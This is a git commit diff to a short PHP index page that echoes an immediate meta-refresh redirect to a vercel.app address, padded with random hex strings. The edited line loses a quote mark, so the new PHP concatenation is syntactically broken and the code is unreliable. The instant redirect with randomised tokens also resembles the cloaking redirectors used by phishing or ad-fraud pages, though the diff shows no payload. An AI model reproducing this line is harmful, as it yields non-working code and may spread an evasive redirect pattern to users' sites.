090180840497c4a38849c141a363b2fab32d59a0
Ula0709 <159502337+Ula0709@users.noreply.github.com>
2024-02-15 23:29:07 -0400

    Update index.php

--- index.php
+++ index.php
@@ -4,5 +4,5 @@ $rand = bin2hex($bytes);
 $bytes2 = openssl_random_pseudo_bytes(10);
 $rand2 = bin2hex($bytes2);
 
-echo '<meta http-equiv="Refresh" content="0;URL=https://dorsite-88mys2qnw-ula0709s-projects.vercel.app/indexpaginaprincipal.html/ads/KyV1SHTKARjFSEwuEpEM?='.$rand.'=?&'.$rand2.'?=">';
+echo '<meta http-equiv="Refresh" content="0;URL=https://dorsite-88mys2qnw-ula0709s-projects.vercel.app/indexpaginaprincipal.html/.$rand.'=?&'.$rand2.'?=">';
 ?>
